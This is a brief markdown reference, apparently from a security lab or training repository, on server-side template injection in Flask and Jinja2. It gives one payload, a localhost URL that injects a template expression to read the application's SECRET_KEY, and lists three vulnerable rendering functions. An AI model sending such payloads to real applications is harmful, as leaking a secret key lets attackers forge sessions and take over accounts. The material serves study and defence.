# Service Side Template Injection

## Payloads

```
http://localhost:5000/ssti1?search={{config['SECRET_KEY']}}
```

## Sinks

- `flask.render_template_string(UNTRUSTED, ...)`
  - https://flask.palletsprojects.com/en/1.1.x/api/?highlight=flask%20render_template_string#flask.render_template_string
- `jinja2.Environment.from_string(UNTRUSTED, ...)`
  - https://jinja.palletsprojects.com/en/2.11.x/api/#jinja2.Environment.from_string
- `jinja2.Template(UNTRUSTED, ...)`
  - https://jinja.palletsprojects.com/en/2.11.x/api/#jinja2.Template
